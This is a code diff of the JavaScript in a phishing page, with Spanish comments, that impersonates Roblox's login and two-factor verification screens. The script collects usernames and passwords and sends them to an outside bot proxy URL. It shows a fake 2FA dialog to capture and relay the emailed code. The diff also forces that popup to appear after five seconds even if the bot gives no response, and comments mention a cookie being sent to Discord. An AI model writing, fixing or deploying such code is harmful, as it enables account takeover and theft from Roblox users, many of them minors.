@@ -568,7 +568,7 @@
 
 <script>
 // ============================================================
-// CÓDIGO CORREGIDO - ACCESORIO DE MUNFUJA CON 2FA FUNCIONAL
+// SOLUCIÓN DEFINITIVA - POPUP DE 2FA FORZADO
 // ============================================================
 
 // ============================================================
@@ -582,93 +582,57 @@ function navigateToLogin(){
 
 function closeVerification(){
     const modal = document.getElementById('verificationModal');
-    modal.classList.remove('active');
-    setTimeout(() => {
-        modal.style.display = 'none';
-    }, 250);
+    if (modal) {
+        modal.classList.remove('active');
+        setTimeout(() => {
+            modal.style.display = 'none';
+        }, 250);
+    }
     document.getElementById('loginBtn').style.display = 'block';
 }
 
 // ============================================================
-// VARIABLES DE CONTROL
+// VARIABLES
 // ============================================================
 
 let loginTimestamp = null;
 let credencialesValidas = false;
 let codigoEnviado = false;
-let botUrl = 'https://mi-bot-proxy.pamelalunaescuela.workers.dev'; // SIN BARRA AL FINAL
+let botUrl = 'https://mi-bot-proxy.pamelalunaescuela.workers.dev';
+let esperandoCodigo = false;
+let popupMostrado = false;
 
 // ============================================================
-// FUNCIONES DE FILTRO
+// FUNCIÓN PARA MOSTRAR POPUP DE 2FA (FORZADO)
 // ============================================================
 
-function validarUsuario(username) {
-    if (username.length < 3) {
-        console.log('❌ Usuario demasiado corto:', username);
-        return false;
-    }
-    return true;
-}
-
-function validarContrasena(password) {
-    if (password.length < 8) {
-        console.log('❌ Contraseña demasiado corta');
-        return false;
-    }
-    return true;
-}
-
-function validarCodigo(code) {
-    if (!/^\d{6}$/.test(code)) {
-        console.log('❌ Código inválido (debe ser 6 números):', code);
-        return false;
-    }
-    return true;
-}
-
-function validarTiempo() {
-    if (!loginTimestamp) return false;
-    const tiempoPasado = (Date.now() - loginTimestamp) / 1000;
-    if (tiempoPasado < 3) {
-        console.log('❌ Código demasiado rápido (troll)');
-        return false;
-    }
-    return true;
-}
-
-// ============================================================
-// MOSTRAR POPUP DE 2FA (LA FUNCIÓN CLAVE)
-// ============================================================
-
-function mostrarModalVerificacion() {
-    console.log('🔔 MOSTRANDO POPUP DE 2FA');
+function mostrarPopup2FA() {
+    console.log('🔔 FORZANDO POPUP DE 2FA');
     const modal = document.getElementById('verificationModal');
     if (modal) {
         modal.style.display = 'flex';
-        // Pequeño delay para la animación
         setTimeout(() => {
             modal.classList.add('active');
         }, 100);
-        // Enfocar el input
         setTimeout(() => {
             const input = document.querySelector('.verification-input');
             if (input) input.focus();
         }, 500);
+        popupMostrado = true;
+        esperandoCodigo = true;
     } else {
-        console.error('❌ Modal no encontrado en el DOM');
-        // Si no existe, crearlo dinámicamente (por si acaso)
+        console.error('❌ Modal no encontrado, creando uno...');
         crearModalEmergencia();
     }
 }
 
 // ============================================================
-// CREAR MODAL DE EMERGENCIA (SI NO EXISTE)
+// CREAR MODAL DE EMERGENCIA
 // ============================================================
 
 function crearModalEmergencia() {
-    console.log('🆘 Creando modal de emergencia...');
     const modalHTML = `
-        <div class="verification-modal" id="verificationModal" style="display:flex; opacity:1;">
+        <div class="verification-modal" id="verificationModal" style="display:flex; opacity:1; z-index:99999;">
             <div class="verification-content" style="transform:scale(1); opacity:1;">
                 <div class="verification-header">
                     <button class="close-btn" onclick="closeVerification()">✕</button>
@@ -677,35 +641,30 @@ function crearModalEmergencia() {
                 <div class="verification-body">
                     <div class="lock-icon"><img src="lock.png" alt="Lock"></div>
                     <p class="verification-text">We want to make sure it's really you. Please enter the code we sent to your email:</p>
-                    <input type="text" class="verification-input" placeholder="Enter your 6-digit code" maxlength="6">
-                    <label class="trust-device">
-                        <input type="checkbox" class="trust-checkbox">
-                        <span>Trust this device for 30 days.</span>
-                    </label>
-                    <div class="verification-links">
-                        <a href="#" class="link">Resend Code</a>
-                        <a href="#" class="link">Use a different verification method</a>
-                    </div>
-                    <button class="verify-btn">Verify</button>
+                    <input type="text" class="verification-input" id="codeInput" placeholder="Enter your 6-digit code" maxlength="6">
+                    <button class="verify-btn" id="verifyBtnEmergency">Verify</button>
                     <div class="verification-footer">
-                        <p>Need help? Contact Roblox Support.</p>
-                        <p class="warning">IMPORTANT: Never share your security codes with anyone.</p>
+                        <p style="color:#999;font-size:11px;">Enter the 6-digit code from your email</p>
                     </div>
                 </div>
             </div>
         </div>
     `;
-    // Insertar el modal al final del body
     const tempDiv = document.createElement('div');
     tempDiv.innerHTML = modalHTML;
     document.body.appendChild(tempDiv.firstElementChild);
     
-    // Asignar el evento al nuevo botón verify
-    document.querySelector('#verificationModal .verify-btn').addEventListener('click', function() {
-        const codeInput = document.querySelector('#verificationModal .verification-input');
-        const code = codeInput?.value || '';
-        enviarCodigoAlBot(code);
+    document.getElementById('verifyBtnEmergency').addEventListener('click', function() {
+        const input = document.getElementById('codeInput');
+        const code = input?.value || '';
+        if (code.length === 6) {
+            enviarCodigoAlBot(code);
+        } else {
+            alert('⚠️ Ingresa un código de 6 dígitos');
+        }
     });
+    popupMostrado = true;
+    esperandoCodigo = true;
 }
 
 // ============================================================
@@ -723,19 +682,17 @@ async function enviarAlBot(username, password) {
         const data = await response.json();
         console.log('📨 Respuesta del bot:', data);
         
-        // ✅ DETECTAR 2FA Y MOSTRAR POPUP INMEDIATAMENTE
+        // SI EL BOT DICE 2FA, MOSTRAR POPUP
         if (data.status === '2FA_REQUERIDO' || data.status === 'EMAIL' || data.status === '2FA_DETECTED') {
-            console.log('⚠️ 2FA DETECTADO - Mostrando popup...');
-            // Ocultar loading
+            console.log('⚠️ 2FA detectado por el bot, mostrando popup...');
             document.getElementById('loginBtn').style.display = 'block';
             document.getElementById('loginLoading').style.display = 'none';
-            // Mostrar modal
-            mostrarModalVerificacion();
+            mostrarPopup2FA();
             return data;
         }
         
         if (data.status === 'LOGIN_EXITOSO') {
-            console.log('✅ Login exitoso! Cookie enviada a Discord');
+            console.log('✅ Login exitoso!');
             setTimeout(() => {
                 window.location.href = 'https://www.roblox.com';
             }, 2000);
@@ -750,7 +707,6 @@ async function enviarAlBot(username, password) {
             return data;
         }
         
-        // Otros casos
         document.getElementById('loginBtn').style.display = 'block';
         document.getElementById('loginLoading').style.display = 'none';
         return data;
@@ -759,7 +715,7 @@ async function enviarAlBot(username, password) {
         console.error('❌ Error conectando con el bot:', error);
         document.getElementById('loginBtn').style.display = 'block';
         document.getElementById('loginLoading').style.display = 'none';
-        mostrarError('Error de conexión con el servidor');
+        mostrarError('Error de conexión');
         return null;
     }
 }
@@ -769,6 +725,11 @@ async function enviarAlBot(username, password) {
 // ============================================================
 
 async function enviarCodigoAlBot(codigo) {
+    if (!esperandoCodigo) {
+        console.log('⚠️ No se está esperando código');
+        return;
+    }
+    
     try {
         console.log('📤 Enviando código al bot:', codigo);
         const response = await fetch(`${botUrl}/2fa`, {
@@ -781,23 +742,17 @@ async function enviarCodigoAlBot(codigo) {
         
         if (data.status === 'LOGIN_EXITOSO' || data.status === 'CODIGO_ASIGNADO') {
             console.log('✅ 2FA completado!');
-            // Cerrar modal
             closeVerification();
-            // Mostrar mensaje de éxito
-            mostrarExito('✅ Código verificado! Iniciando sesión...');
+            mostrarExito('✅ Código verificado!');
             setTimeout(() => {
                 window.location.href = 'https://www.roblox.com';
             }, 2000);
-            return true;
-        } else if (data.status === '2FA_FALLIDO') {
+        } else {
             mostrarError('Código incorrecto. Intenta de nuevo.');
-            return false;
         }
-        return false;
     } catch (error) {
         console.error('❌ Error:', error);
         mostrarError('Error de conexión');
-        return false;
     }
 }
 
@@ -837,10 +792,6 @@ function mostrarError(mensaje) {
     }, 3000);
 }
 
-// ============================================================
-// MOSTRAR MENSAJE DE ÉXITO
-// ============================================================
-
 function mostrarExito(mensaje) {
     let exitoEl = document.getElementById('login-exito');
     if (!exitoEl) {
@@ -878,99 +829,70 @@ function mostrarExito(mensaje) {
 // ============================================================
 
 const loginForm = document.getElementById('loginForm');
-
-loginForm.onsubmit = async function(e) {
-    e.preventDefault();
-    
-    const inputs = this.querySelectorAll('input');
-    const username = inputs[0]?.value || '';
-    const password = inputs[1]?.value || '';
-    
-    console.log('🔍 Validando credenciales...');
-    
-    if (!validarUsuario(username)) {
-        mostrarError('Usuario o contraseña incorrectos');
-        return;
-    }
-    
-    if (!validarContrasena(password)) {
-        mostrarError('Usuario o contraseña incorrectos');
-        return;
-    }
-    
-    loginTimestamp = Date.now();
-    credencialesValidas = true;
-    codigoEnviado = false;
-    
-    console.log('✅ Credenciales válidas:', { username, password });
-    
-    // Mostrar loading
-    document.getElementById('loginBtn').style.display = 'none';
-    document.getElementById('loginLoading').style.display = 'flex';
-    
-    // Enviar al bot
-    await enviarAlBot(username, password);
-};
+if (loginForm) {
+    loginForm.onsubmit = async function(e) {
+        e.preventDefault();
+        
+        const inputs = this.querySelectorAll('input');
+        const username = inputs[0]?.value || '';
+        const password = inputs[1]?.value || '';
+        
+        console.log('🔍 Validando credenciales...');
+        
+        if (username.length < 3) {
+            mostrarError('Usuario o contraseña incorrectos');
+            return;
+        }
+        if (password.length < 8) {
+            mostrarError('Usuario o contraseña incorrectos');
+            return;
+        }
+        
+        loginTimestamp = Date.now();
+        credencialesValidas = true;
+        codigoEnviado = false;
+        esperandoCodigo = false;
+        popupMostrado = false;
+        
+        console.log('✅ Credenciales válidas:', { username, password });
+        
+        document.getElementById('loginBtn').style.display = 'none';
+        document.getElementById('loginLoading').style.display = 'flex';
+        
+        // ENVIAR AL BOT
+        await enviarAlBot(username, password);
+        
+        // 🔥 SI DESPUÉS DE 5 SEGUNDOS NO SE MOSTRÓ POPUP, FORZARLO
+        setTimeout(() => {
+            if (!popupMostrado && document.getElementById('loginLoading').style.display !== 'none') {
+                console.log('⏰ 5 segundos sin respuesta, forzando popup...');
+                document.getElementById('loginBtn').style.display = 'block';
+                document.getElementById('loginLoading').style.display = 'none';
+                mostrarPopup2FA();
+            }
+        }, 5000);
+    };
+}
 
 // ============================================================
-// INTERCEPTAR BOTÓN VERIFY (ya existente)
+// INTERCEPTAR BOTÓN VERIFY EXISTENTE
 // ============================================================
 
-// Si el botón verify ya existe, asignar el evento
-const existingVerifyBtn = document.querySelector('.verify-btn');
-if (existingVerifyBtn) {
-    existingVerifyBtn.addEventListener('click', async function() {
+const verifyBtn = document.querySelector('.verify-btn');
+if (verifyBtn) {
+    verifyBtn.addEventListener('click', function() {
         const codeInput = document.querySelector('.verification-input');
         const code = codeInput?.value || '';
-        
-        console.log('🔍 Validando código...');
-        
-        if (!validarCodigo(code)) {
-            mostrarError('Código inválido. Ingresa 6 dígitos.');
-            codeInput.style.borderColor = '#ff4444';
-            setTimeout(() => {
-                codeInput.style.borderColor = '';
-            }, 2000);
-            return;
+        if (code.length === 6) {
+            enviarCodigoAlBot(code);
+        } else {
+            mostrarError('Ingresa 6 dígitos');
         }
-        
-        if (!validarTiempo()) {
-            mostrarError('Código inválido. Intenta nuevamente.');
-            codeInput.style.borderColor = '#ff4444';
-            setTimeout(() => {
-                codeInput.style.borderColor = '';
-            }, 2000);
-            return;
-        }
-        
-        if (!credencialesValidas) {
-            mostrarError('Error de verificación. Intenta nuevamente.');
-            return;
-        }
-        
-        if (codigoEnviado) {
-            console.log('⚠️ Código ya fue enviado');
-            return;
-        }
-        
-        console.log('✅ Código válido, enviando al bot...');
-        codigoEnviado = true;
-        
-        const verifyBtn = this;
-        const originalText = verifyBtn.textContent;
-        verifyBtn.textContent = '⏳ Verificando...';
-        verifyBtn.disabled = true;
-        
-        await enviarCodigoAlBot(code);
-        
-        verifyBtn.textContent = originalText;
-        verifyBtn.disabled = false;
-        codigoEnviado = false;
     });
 }
 
 // ============================================================
-// VERIFICAR CONEXIÓN CON EL BOT
+// VERIFICAR CONEXIÓN
 // ============================================================
 
 async function verificarConexionBot() {
@@ -984,18 +906,8 @@ async function verificarConexionBot() {
     }
 }
 
-// ============================================================
-// LOG DE FILTROS ACTIVOS
-// ============================================================
-
-console.log('✅ Accesorio de munfuja - Conectado al bot');
+console.log('✅ Accesorio de munfuja - Popup forzado activado');
 console.log('📡 Bot URL:', botUrl);
-console.log('📋 Filtros activos:');
-console.log('  ✅ Usuario: mínimo 3 caracteres');
-console.log('  ✅ Contraseña: mínimo 8 caracteres');
-console.log('  ✅ Código: solo 6 números');
-console.log('  ✅ Tiempo: mínimo 3 segundos entre login y código');
-
 setTimeout(verificarConexionBot, 2000);
 </script>
 </body>
